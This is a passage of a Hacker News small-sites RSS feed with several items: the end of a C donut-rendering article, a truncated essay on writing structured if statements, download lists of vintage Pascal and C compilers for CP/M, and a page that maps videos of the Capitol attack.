            <span>y</span> <span>=</span> <span>12</span> <span>+</span> <span>15</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x4</span> <span>+</span> <span>sB</span><span>*</span><span>x1</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>N</span> <span>=</span> <span>(</span><span>-</span><span>cA</span><span>*</span><span>x7</span> <span>-</span> <span>cB</span><span>*</span><span>((</span><span>-</span><span>sA</span><span>*</span><span>x7</span><span>&gt;&gt;</span><span>10</span><span>)</span> <span>+</span> <span>x2</span><span>)</span> <span>-</span> <span>ci</span><span>*</span><span>(</span><span>cj</span><span>*</span><span>sB</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>-</span> <span>x5</span> <span>&gt;&gt;</span> <span>7</span><span>;</span>

        <span>int</span> <span>o</span> <span>=</span> <span>x</span> <span>+</span> <span>80</span> <span>*</span> <span>y</span><span>;</span>
        <span>int8_t</span> <span>zz</span> <span>=</span> <span>(</span><span>x6</span><span>-</span><span>K2</span><span>)</span><span>&gt;&gt;</span><span>15</span><span>;</span>
        <span>if</span> <span>(</span><span>22</span> <span>&gt;</span> <span>y</span> <span>&amp;&amp;</span> <span>y</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>x</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>80</span> <span>&gt;</span> <span>x</span> <span>&amp;&amp;</span> <span>zz</span> <span>&lt;</span> <span>z</span><span>[</span><span>o</span><span>])</span> <span>{</span>
          <span>z</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>zz</span><span>;</span>
          <span>b</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>".,-~:;=!*#$@"</span><span>[</span><span>N</span> <span>&gt;</span> <span>0</span> <span>?</span> <span>N</span> <span>:</span> <span>0</span><span>];</span>
        <span>}</span>
        <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>ci</span><span>,</span> <span>si</span><span>)</span>  <span>// rotate i</span>
      <span>}</span>
      <span>R</span><span>(</span><span>9</span><span>,</span> <span>7</span><span>,</span> <span>cj</span><span>,</span> <span>sj</span><span>)</span>  <span>// rotate j</span>
    <span>}</span>
    <span>for</span> <span>(</span><span>int</span> <span>k</span> <span>=</span> <span>0</span><span>;</span> <span>1761</span> <span>&gt;</span> <span>k</span><span>;</span> <span>k</span><span>++</span><span>)</span>
      <span>putchar</span><span>(</span><span>k</span> <span>%</span> <span>80</span> <span>?</span> <span>b</span><span>[</span><span>k</span><span>]</span> <span>:</span> <span>10</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>7</span><span>,</span> <span>cA</span><span>,</span> <span>sA</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>cB</span><span>,</span> <span>sB</span><span>);</span>
    <span>usleep</span><span>(</span><span>15000</span><span>);</span>
    <span>printf</span><span>(</span><span>"</span><span>\x1b</span><span>[23A"</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The output is pretty much the same.</p>

</article>







      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://www.a1k0n.net/2021/01/13/optimizing-donut.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787545</guid>
            <pubDate>Fri, 15 Jan 2021 06:01:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured programming: how to write proper if statements]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25786956">thread link</a>) | @harporoeder
<br/>
January 14, 2021 | http://boris-marinov.github.io/if/ | <a href="https://web.archive.org/web/*/http://boris-marinov.github.io/if/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The <code>if</code> statement (or <code>if</code> expression) is the cornerstone of every modern programming language - it is so pervasive that we rarely think about how exactly should we use it, or how it is meant to be used. But despite its popularity, <code>if</code> wasn√¢‚Ç¨‚Ñ¢t always there, and it wasn√¢‚Ç¨‚Ñ¢t as pervasive as nowadays, so its role is, I√¢‚Ç¨‚Ñ¢d argue, still somewhat misunderstood. So in this article, I will examine some mistakes that we can easily avoid in order to improve on our code.</p>

<!--more-->



<p>This is an opinionated text, i.e. it contains my opinions and although I have many arguments that back them, they are ultimately based on <em>my</em> core beliefs about what programming is and should be, so take them as advice, as opposed to a dogma. And here are some of the things on which this advice is based on, structured as postulates.</p>

<blockquote>
  <p>Code is for humans (and programmers are humans too).</p>
</blockquote>

<p>A form of this appears in a little book known in the hacker community as √¢‚Ç¨≈ìSICP√¢‚Ç¨ÔøΩ, but I don√¢‚Ç¨‚Ñ¢t know if they were the first to state it. It means that programs are not just instructions for performing a given task - they are text, and as such they should be subject to the same stylistical rules as other text is.</p>

<blockquote>
  <p>Code should be as bug-free as possible (and easy to debug as well).</p>
</blockquote>

<p>This one looks pretty self-explanatory, but the key point is that we have to dedicate effort to make it such, by constantly thinking not only about ways in which the code might go wrong, but also about ways to diagnose potential problems.</p>

<p>I guess I should say something about why I believe these things. Simple - because all other approaches just fail because of the human factor, e.g. any code, that is written without regard for style is bound to become legacy when the person who supports it leaves. Likewise, maintaining code that lacks structure results in bugs (which often can be fixed only by imposing more structure).</p>

<p>Lastly, people often contrast good structure and readability with speed. Firstly, the comparison is a bit unfair, because a well-structured is easier to optimize. And for cases in which it is really the case, in 99% the gain is so little that nobody cares, so the emphasis should remain on readability and structure even then. This is when I would throw this very famous quote by DEK:</p>

<blockquote>
  <p>Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97 % of the time: pre mature optimization is the root of all evil.
<a href="http://www.kohala.com/start/papers.others/knuth.dec74.html">source</a></p>
</blockquote>

<p>Keep in mind that he wrote this when computers were a thousand times slower than today, so we should care about maintainability even more.</p>



<p>Once upon a time, all there was was the assembly language where people didn√¢‚Ç¨‚Ñ¢t have brackets and had to use <code>jump</code> instructions instead. For those who don√¢‚Ç¨‚Ñ¢t know what jump does, if you imagine that somewhere in the virtual machine, or the interpreter, that runs your code there is a variable that denotes which line of code should be executed next, then <code>jump</code> is a functionality that basically allows you to set that variable to whatever value you please - it is like a portal that allows you to go to from any place of the program to any other place. For example, a typical <code>if</code> statement that looks like this when written with jumps:</p>

<div><div><pre><code>compare input to waterlevel
if less, jump to A
if equal, jump to B
jump to C

A:
turn motor on
jump to C

B:
turn motor off
C:
...
</code></pre></div></div>
<p><a href="https://stackoverflow.com/questions/40602029/how-to-write-if-else-in-assembly">Source for the assembly pseudocode</a></p>

<p>You can see from this example that, although powerful, jumps are much harder to work with than <code>if</code>-s, although they can sometimes make your code a bit shorter, they will 100% make it less readable which is hardly a good deal - if the important thing is for code to bug free, so you√¢‚Ç¨‚Ñ¢d always prefer to have a longer and more readable piece of code, than one which is shorter but harder to understand. This realization led to the rise of what was at the time called √¢‚Ç¨≈ìstructural programming√¢‚Ç¨ÔøΩ paradigm, which was based on the idea that the power of jumps should not be exposed to the programmer - a point which was brought by Edsger W. Dijkstra in the seminal essay <a href="http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html">Go To Statement Considered Harmful</a> (<code>goto</code> is the equivalent of a <code>jump</code> instruction statements in non-assembly language context). Simultaneously, the idea of a <em>block</em> (or a √¢‚Ç¨≈ìcompound statement√¢‚Ç¨ÔøΩ) meaning a collection statements that perform a common task (usually denoted today by wrapping them in curly brackets) was pushed forward, and the two ideas gave birth to the <code>if</code> statement that we know today (that <a href="https://craftofcoding.wordpress.com/2017/04/29/the-evolution-of-if-i-from-fortran-i-to-algol-60/">first appeared in the <em>Algol 60</em> programming language</a>):</p>

<div><div><pre><code>if (input less than waterlevel) {
  turn motor on
} else if (input equal to waterlevel) {
turn motor off
} else {
...
</code></pre></div></div>

<p>The adoption of structured programming was a long process which began with people even questioning whether structured programs are even capable of encoding all possible computations, but today, although some people are <a href="https://stackoverflow.com/questions/46586/goto-still-considered-harmful">still defending the use of goto</a>, it (the process) is largely finished - <code>goto</code> is banished and the structured style of programming is so pervasive across modern languages that the term √¢‚Ç¨≈ìstructured√¢‚Ç¨ÔøΩ is not used any more, simply because there is nothing to contrast it with.</p>

<p>And to reiterate, the reasons for this are quite obvious - using brackets makes our code much more akin to the way we usually talk and write with each other: we often say</p>

<blockquote>
  <p>√¢‚Ç¨≈ìif A then B otherwise C√¢‚Ç¨ÔøΩ</p>
</blockquote>

<p>we never say things like,</p>

<blockquote>
  <p>√¢‚Ç¨≈ìif A then go to the previous page and start reading from line 12√¢‚Ç¨ÔøΩ.</p>
</blockquote>

<p>(I wonder if the programmers who defend the use of <code>goto</code> write and talk like that?)</p>

<p>This already leads me to the first rule that I always follow.</p>



<p>A leftover from the <code>goto</code>-driven style of programming is the possibility of so-called √¢‚Ç¨≈ìearly exit√¢‚Ç¨ÔøΩ - the ability to quit the execution of a given function or method from any place of it√¢‚Ç¨‚Ñ¢s body (most-oftenly by using the keyword <code>return</code>) as opposed to executing the function to the end. So again if we consider our plain old <code>if</code> <code>else</code> statement:</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
} else {
    turn motor off
}
...
</code></pre></div></div>
<p>Using <code>return</code> we can write it like this</p>

<div><div><pre><code>if (input less than waterleve) {
    return turn motor on
} 
turn motor off
...
</code></pre></div></div>

<p>When used like this, <code>return</code> is directly translatable to a <code>goto</code>.</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
    Jump to C
}
turn motor off
C:
...
</code></pre></div></div>

<p>Why not write like this? We already established that <code>goto</code> is bad and I√¢‚Ç¨‚Ñ¢d argue that mixing the two approaches is even worse in some respects, as it might fool you that the code is structured when it really isn√¢‚Ç¨‚Ñ¢t. Furthermore, the early exit makes our code as confusing as any other <code>goto</code>-containing code when translated to natural language. Imagine someone saying:</p>

<blockquote>
  <p>√¢‚Ç¨≈ìBring me a coffee if you get home early.√¢‚Ç¨ÔøΩ</p>
</blockquote>

<p>and then imagine them saying.</p>

<blockquote>
  <p>√¢‚Ç¨≈ìIf you don√¢‚Ç¨‚Ñ¢t get home early ignore everything I√¢‚Ç¨‚Ñ¢d say after this sentence. Bring me a coffee.√¢‚Ç¨ÔøΩ</p>
</blockquote>

<p>So if your language supports it, always rely on the implicit <code>return</code> instead of explicitly ending your execution. If not, the simple rule you can follow is that you should either return from all branches of the <code>if</code> statement or from none of them.</p>

<h2 id="combining-ifs-with-functions">Combining <code>if</code>√¢‚Ç¨‚Ñ¢s with functions</h2>

<p>The most common type of situation that I have seen the premature <code>return</code> pattern is for handling errors. Imagine for example a very long function with some validation at the beginning. Many people would write:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } 

  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
  ...
}
</code></pre></div></div>

<p>This is a very subtle variant of the issue I am describing (made even more subtle by the fact that <code>throw</code> is used instead of a <code>return</code>). The correct way would be:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } else {
      create account for user
      sign user up
      initialise some other stuff
      write action in log
      send emails
    ...
  }
}
</code></pre></div></div>

<p>but people would prefer having the main function code directly in the body in order to avoid indentation (especially if there is a lot of it already). According to them (and they have a point) the error handling is somewhat outside of the domain of the function, we can perhaps say that they are at different levels of abstraction. In cases like this, we should use <em>functions</em> to structure our code and to keep the different levels of abstraction separate.</p>

<p>Functions are everything that random sequences of statement are not and can never be - they <em>have names</em>, they have <em>a separate scope</em> (blocks also have their own scope, but they also inherit the scope of the parent block), and most importantly they are <em>easy to debug</em> (e.g. you have the name of the thing that went wrong right there on the top of the stack trace. So let√¢‚Ç¨‚Ñ¢s look at how the code above can be made to work with functions. I think this is a very cool and underused pattern that allows you to lose the indentation without sacrificing your structure.</p>
<div><div><pre><code>
signup (user) {
  if (username is valid ) {
      throw invalid username
  } else {
      return signup internal (user)
  }
}

signup internal (user) { // or _signup as some people name it
  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
...
}
</code></pre></div></div>



<p>This is another bad pattern that, we might say, has the same root cause as the first one - in their effort to keep things simple and concise, people don√¢‚Ç¨‚Ñ¢t include all the structure that needs to be there in a robust piece of code.</p>

<p>In <code>if</code> statements we often have to deal with multiple conditions that are dependent on one another. And sometimes in such cases, people try to deal with all of them in one statement with multiple branches and <code>else if</code>-s. I argue that it√¢‚Ç¨‚Ñ¢s actually better to have <em>one statement per condition</em> ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://boris-marinov.github.io/if/">http://boris-marinov.github.io/if/</a></em></p>]]>
            </description>
            <link>http://boris-marinov.github.io/if/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786956</guid>
            <pubDate>Fri, 15 Jan 2021 04:18:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old Pascal compilers for CP/M]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786922">thread link</a>) | @peter_d_sherman
<br/>
January 14, 2021 | http://www.z80.eu/pas-compiler.html | <a href="https://web.archive.org/web/*/http://www.z80.eu/pas-compiler.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        <td>
                            
                            <p><span size="2">:... if you do not like C compiler&nbsp;!</span></p>
                            <p>Nikolaus Wirth invented 1970 a new programming language named 'PASCAL' (in fact it was influenced by&nbsp;<a href="http://www.algol68.org/">Algol</a>, see also <a href="http://www.xs4all.nl/~jmvdveer/algol.html">here</a> for a working compiler). Later this language was available also for CP/M. </p>
                            <p>As a foreword: I am offering the following compiler just for educational, non profit purpose. If any of the former copyright holder send me a mail that this is unwanted, I will immediately delete the concerned&nbsp;file.</p>
                            <p>Here are the Pascal&nbsp;compiler as complete packages (I do not offer every item by myself, instead, most of these offerings are just links to other sites):</p>
                            <p><a href="http://www.retroarchive.org/cpm/archive/unofficial/download/dripas.zip">Pascal MT+ compiler v. 5.5</a> Speed Programming Package included</p>
                            <p><a href="http://www.cpm.z80.de/download/mtp561.zip">Pascal MT+ compiler v. 5.6.1</a> also for CP/M</p>
                            <p><a href="http://www.cpm.z80.de/manuals/mtlang.zip">Pascal MT+ compiler v. 5.6.1 manual</a> in Postscript</p>
                            <p><a href="http://www.cpm.z80.de/manuals/spp.zip">PASCAL MT+ Speed programming package docu</a> in text format</p>
                            <p><a href="http://www.gaby.de/cpm/manuals/archive/mtplus/mtp_src.zip">PASCAL MT+ manual</a> in Word Format</p>
                            <p><a href="http://www.retroarchive.org/cpm/archive/unofficial/download/mtp80htm.zip">PASCAL MT+ manual</a> in HTML Format zipped</p>
                            <p><a href="http://www.iso.port.ac.uk/~mike/interests/chistory/documents/pascal-mt-manual/">Pascal MT+ Manual in HTML</a> online</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/TP_301A.ZIP">Turbo PASCAL 3.01A</a> for CP/M-80</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/tpas30.zip">Turbo PASCAL 3.0</a> for CP/M</p>
                            <p><a href="http://www.z80.eu/downloads/tp20a.zip">Turbo PASCAL 2.0</a> for CP/M (now complete, locally hosted)<br>
...and a patch&nbsp;for TP 2.0 <a href="http://www.z80.eu/downloads/TURBUSER.TXT">here</a> (fixes exit always to user 0)</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/tpas10.zip">Turbo PASCAL 1.0</a> for CP/M</p>
                            <p><a href="http://www.z80.eu/downloads/tp3-pat01.zip">Turbo PASCAL 3.01 Patches</a></p>
                            <p><a href="http://www.z80.eu/downloads/pdtins12.zip">Public Domain Turbo Pascal Terminal Installer</a> (PDTINS) version 1.2</p>
                            <p><a href="http://www.z80.eu/downloads/jrtpas20.zip">JRT PASCAL 2.0</a> for CP/M taken from SIGM Vol. 82 (locally hosted)</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS.ZIP">JRT PASCAL 2.2</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS30.ZIP">JRT PASCAL 3.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS40.ZIP">JRT PASCAL 4.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/PASCALZ4.ZIP">PASCAL/Z 4.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319UPD.LBR">PASCAL-P Compiler version 3.1.9</a> (from C.B. Falconer)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319FIX.LBR">Fix to Pascal-P v 3.1.9</a></p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319DOC.LBR">Documentation for Pascal-P</a></p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PPMANUAL.PRN">Pascal-P Manual</a> (printed format)</p>
                            <p><a href="https://web.archive.org/web/20070204000316/http://cbfalconer.home.att.net/download/ppmanual.zip">Manual for PASCAL/P</a></p>
                            <p><a href="http://www.classiccmp.org/cpmarchives/cpm/mirrors/cbfalconer.home.att.net/download/cpm/pp.zip">Various PASCAL/P files</a></p>
                            <p><a href="http://www.z80.eu/downloads/pascal.zip">"Pascal Pascal Compiler" v1 from Robert A. Van Valzah</a><br>
 (locally hosted, from 1980)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/SIMTEL/CPMUG/CPMUG050.ARK">"Pascal Pascal Compiler" v2 from Robert A. Van Valzah</a> from SIMTEL CPMUG 050, this seems to be a more complete but different version</p>
                            <p><br>
Interesting source code for Pascal MT+ or Turbo PASCAL:</p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/CMDMAK.html">PASCAL MT+ Source Show Directory</a> (all USER areas)</p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/DirString.html">TPASCAL 3.0 Show Directory 1</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/Wildcards.html">TPASCAL 3.0 Show Directory 2</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/TurboDir.html">TPASCAL 3.0 Show Directory 3</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/TurboDirectory.html">TPASCAL 3.0 Show Directory 4</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/DirectoryPascal.html">TPASCAL 3.0 Show Directory 5</a></p>
                            <p><a href="http://www.z80.eu/downloads/TPLESSN1.ARC">Turbo PASCAL Lessons&nbsp;Disk 1</a> (locally hosted)</p>
                            <p><a href="http://www.z80.eu/downloads/TPLESSN2.ARC">Turbo PASCAL Lessons&nbsp;Disk 2</a> (locally hosted)</p>
                            <p><a href="http://www.z80.eu/downloads/tptutor.zip">Turbo PASCAL Tutor</a> (locally hosted)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/TURBOPAS/TKERMIT.LBR">Kermit in Turbo PASCAL</a></p>
                            <p><a href="http://www.z80.eu/downloads/usq141.zip">Unsqueezer source code</a> in Turbo PASCAL (locally hosted)</p>
                            <p>A <a href="http://www.z80.eu/downloads/asmz80.zip">Z80 Assembler written in Turbo PASCAL 3.0</a> source code and executable included, source file was shrinked with a tool named PCRYPT (runs under DOS), because it's too big for the editor. Very useful.</p>
                            <p><a href="http://www.z80.eu/downloads/paspretty80.zip">Pascal "pretty" formatter</a> source code (locally hosted)</p>
                            <p>Very interesting is also the PASCAL P&nbsp;compiler in <u><i>source code</i></u>:</p>
                            <p><a href="http://homepages.cwi.nl/~steven/pascal/">PASCAL Compiler and Interpreter</a>, produces P4 Code, source files for compiling with another PASCAL-Compiler or with a C-Compiler.</p>
                            
                            <p><a href="http://www.schorn.ch/cpm/zip/ucsd.zip">USCD Pascal II.9</a> for Altair Simulator/SIMH</p>
                            <p><a href="http://www.autometer.de/unix4fun/z80pack/ucsdpascalvii.pdf">USCD Pascal Manual</a> in PDF</p>
                            <p><a href="http://invent.ucsd.edu/technology/cases/1995-prior/I.5Sources.zip">UCSD Pascal I.5</a> Sources</p>
                            <p>I rediscovered a very old archive file with UCSD version I.3 files.<br>
Though I am unsure about an interest and if it's already mirrored or not,<br>
 I show you the contents of the archive file <a href="http://www.z80.eu/UCSD.html">here</a>, but at the moment I am not offering any downloadable file, because there might be files included, which are of personal nature.</p>
                            <p><span color="#990000"><b><i>New:</i></b></span> Please take a look also at <a href="http://www.z80.eu/mod2-compiler.html">my new Modula-2 page</a>.<br>
&nbsp;</p>
                        </td>
                    </div></div>]]>
            </description>
            <link>http://www.z80.eu/pas-compiler.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786922</guid>
            <pubDate>Fri, 15 Jan 2021 04:13:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old C compilers for CP/M]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786918">thread link</a>) | @peter_d_sherman
<br/>
January 14, 2021 | http://www.z80.eu/c-compiler.html | <a href="https://web.archive.org/web/*/http://www.z80.eu/c-compiler.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="548">
                <h2><br>
<img src="http://www.z80.eu/images/nth_theme_blue_blue13_bullet_s.gif">
 C compiler for CP/M - there are a lot of them ...</h2>
                <div><p><b><span color="#0000CC">What compiler should somebody use for programming CP/M applications ...</span></b><span size="2"><br>
:... if you do not like or just do not want to use Turbo PASCAL 3.0 ?</span></p><p>

Since 1973 (<a href="https://www.bell-labs.com/usr/dmr/www/primevalC.html">earliest versions of 'C'</a>) many C compilers were published, of course also for CP/M. Some of them surprisingly offers floating number support, some of them are at least K&amp;R (Kernighan-Ritchie) standard compatible.</p></div>
                <p>As a foreword: I am offering the following compiler just for educational, non profit purpose. If any of the former copyright holder send me a mail that this is unwanted, I will immediately delete the concerned&nbsp;file.</p>
                <p>Here are the C compiler as complete packages:</p>
                <p><a href="http://www.z80.eu/downloads/arnor-c100.zip">Arnor C 1.00</a> (no math lib, originally for Amstrad CPCs)</p>
                <p><a href="http://www.z80.eu/downloads/ASCII-C11.zip">ASCII C 1.1</a> (for MSX-DOS, which is almost CP/M compatible)</p>
                <p><a href="http://www.z80.eu/downloads/Aztec-C106d.zip">Aztec C 1.06d</a></p>
                <p><a href="http://www.z80.eu/downloads/bdsc-all.zip">BDS-C 1.6 &amp; 2.0</a> (complete package for CP/M + ZCPR3)</p>
                <p><a href="http://www.z80.eu/downloads/ECO-C343.zip">Ecosoft C Compiler 3.43</a> (Z80; thanks to Rolf Harrmann !)</p>
                <p><a href="http://www.z80.eu/downloads/z80v309.lzh">HiTech C 3.09</a> (Z80. locally mirrored) and a manual for it (<a href="http://www.z80.eu/downloads/z80doc.zip">locally mirrored</a>)</p>
                <p><a href="http://www.z80.eu/downloads/HiSoft-C135.zip">HiSoft C 1.35</a></p>
                <p><a href="http://www.z80.eu/downloads/ManxC105.zip">ManxC 1.05</a></p>
                <p><a href="http://www.z80.eu/downloads/mi_c_318.zip">Mi-C 3.18</a></p>
                <p><a href="http://www.z80.eu/downloads/mix-c20.zip">Mix C Compiler 2.0</a></p>
                <p>Mix C Compiler 2.1 - see <a href="http://www.cpm8680.com/mix/index.htm">Bill Buckels web pages</a></p>
                <p><a href="http://www.z80.eu/downloads/c80v31a.zip">Q/C Compiler V3.1a</a> (Z80, Codeworks aka Quality Computer Systems)</p>
                <p><a href="http://www.z80.eu/downloads/SIL15new.zip">SIL 1.5 from Digilog</a> (with a subset of C, but with some other extensions)</p>
                <p><a href="http://www.z80.eu/downloads/smallc21.zip">Small C 2.1</a> (no float, partly K &amp; R, source exists <a href="http://z80cpu.eu/mirrors/ftp.mayn.de/pub/cpm/archive/smallc21/">here</a>)</p>
                <p><a href="http://www.z80.eu/downloads/small_c_27.zip">Small C 2.7</a> (created by F. A. Scacchitti in Oct. 1986)</p>
                <p><a href="http://www.z80.eu/downloads/Small-C-wfloats.zip">Small C 1.2 with floats</a> (Z80, SIG/M 224)</p>
                <p><a href="http://www.z80.eu/downloads/SmallCplus.zip">Small C/Plus with floats and structs/unions</a> (v1.0, 1988)</p>
                <p>Another <i>Small C</i> variant named <i>MESCC</i> with code optimizations&nbsp;from Miguel I. Garc√≠a L√≥pez can be found at <a href="http://www.floppysoftware.es/mescc.html">his webpage</a> , an old&nbsp;local mirror is <a href="http://www.z80.eu/downloads/mescc101.zip">here</a> (he has also a <a href="https://github.com/MiguelVis/RetroProjects/tree/master/mescc">Github page</a> with a current version)</p>
                <p><a href="http://www.z80.eu/downloads/ssoft-c-13.zip">Supersoft C 1.3</a> (not sure all needed files are included, plz feedback)</p>
                <p><a href="http://www.z80.eu/downloads/WhiteSmithC20.zip">Whitesmith C 2.0</a> (seems complete)</p>
                <p><a href="http://www.z80.eu/downloads/WhiteSmithC21.zip">Whitesmith C 2.1</a> (now also complete !)</p>
                <p><br>
Some additional info to interpreters for C or C-alike languages:</p>
                <p><a href="http://primepuzzle.com/tiny-c/TINY-C.LBR">Tiny-C</a> CP/M version&nbsp;(C alike interpreter for learning purposes)</p>
                <p><a href="http://www.z80.eu/downloads/SCI-12.zip">"Small C" Interpreter 1.2</a> from Bob Brodt (real C)</p>
                <p> Interesting for Small C enthusiasts can be <a href="http://www.project-fbin.hostoi.com/index.htm">this site</a>, it contains also some historical background to Small-C and CP/M.</p>
                <p>Dave Dunfield's "<a href="http://www.classiccmp.org/dunfield/dos/mc323pc.zip">Micro C</a>" which can produce also <a href="http://www.classiccmp.org/dunfield/dos/mc323d85.zip">8080 code</a>, please visit also his great pages at <a href="http://www.dunfield.com/">http://www.dunfield.com/</a></p>
                <p><a href="http://tack.sourceforge.net/">The Amsterdam Compiler Kit</a> can produce also executables for CP/M (8080 code).</p>
                <p><i>New:</i> <span><a href="http://sdcc.sourceforge.net/">sdcc - a retargettable, optimizing&nbsp;ANSI C-Compiler Suite</a> (also for Z80)</span></p>
                <p>Last but not least the <a href="http://www.z88dk.org/wiki">z88dk</a> (not only for the z88, it's a cross development tool for several platforms) should me mentioned here also.</p>
                <h2><img src="http://www.z80.eu/images/nth_theme_blue_blue13_new.gif"><u><b>Tests of compatibility</b></u>:</h2>
                <p>I choosed&nbsp;an unusual source code, AES256 Encryption and Decryption from &gt;<a href="http://www.literatecode.com/2007/11/11/aes256/">Literatecode</a>&lt;, which is a quite complex program&nbsp;for CP/M-80.</p>
                <p>I had to change the source code to K&amp;R syntax (good old days), and had to shorten the subroutine names a bit (remember, there's a small limit for external symbol names, which is totally unusual for current C compiler&nbsp;!).<br>
Also, I defined a pointer type for easier subroutine parameter declaration.</p>
                <div><p>For convinience reasons, I did not take <i>aes256.h</i> for type definitions.</p><p>

I was a bit surprised after I got it </p><u><span color="#990000">really working</span></u><p> - at least with HiTech C.<br>
All other C compiler hat their own, special problems, e.g. producing assembler or object code didn't work due to more restrictions for external symbols, or just errors when linking it together.</p><p>

This is the output of the CP/M-80 AES256 demo program:</p><p><span face="Courier New">B&gt;demo<br>
txt: 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF<br>
key: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18<br>
19 1A 1B 1C 1D 1E 1F<br>
---<br>
enc: 8E A2 B7 CA 51 67 45 BF EA FC 49 90 4B 49 60 89<br>
tst: 8e a2 b7 ca 51 67 45 bf ea fc 49 90 4b 49 60 89<br>
dec: 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF<p>
&nbsp;
B&gt;</p></span></p></div>
                <p>And here is the source code with the readily compiled CP/M-80 executable:<br>
&gt;<a href="http://www.z80.eu/downloads/aes256.zip">aes256.zip</a>&lt;<br>
(<i>aes256.h </i>is not included as a separate file, it's integrated within the source)<br>
The CP/M-80 executable included is the above shown <i>demo.com</i>.<br>
So it would be possible to write your own CP/M-80 encryption program (think about the execution speed... you have to be patient).</p>
            </div></div>]]>
            </description>
            <link>http://www.z80.eu/c-compiler.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786918</guid>
            <pubDate>Fri, 15 Jan 2021 04:13:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mapping the videos of the Capitol building attack]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786731">thread link</a>) | @basicplus2
<br/>
January 14, 2021 | https://thepatr10t.github.io/yall-Qaeda/ | <a href="https://web.archive.org/web/*/https://thepatr10t.github.io/yall-Qaeda/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


      






<div>

      

      <div>
	
        <div>
          <p>
              Click on the colored 
              (
		<span>*</span>
		<span>*</span>
		<span>*</span>
		<span>*</span>
		) markers to select a
              video to view. 4 colors are used to make the videos easier to tell apart. The
              <span>white</span> markers indicate
              videos that have not been uploaded yet. New videos are being added
              slowly, so be sure to check back often!
            </p>
        </div>
      </div>

</div>

    </div></div>]]>
            </description>
            <link>https://thepatr10t.github.io/yall-Qaeda/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786731</guid>
            <pubDate>Fri, 15 Jan 2021 03:40:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Energy Monitoring Using Smart Plug and Raspberry Pi]]>
            </title>
            <description>
